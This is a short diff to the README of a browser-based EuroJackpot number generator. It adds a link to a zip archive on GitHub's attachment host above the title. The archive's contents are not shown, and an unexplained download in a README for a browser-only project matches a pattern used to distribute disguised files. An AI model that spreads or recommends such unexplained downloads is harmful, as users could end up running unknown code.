@@ -1,3 +1,4 @@
+[EuroJackpotGenerator.zip](https://github.com/user-attachments/files/19775313/EuroJackpotGenerator.zip)
 # EuroJackpot Number Generator 🎰
 
 This is a simple, browser-based EuroJackpot number generator built with HTML, JavaScript, and CSS. 
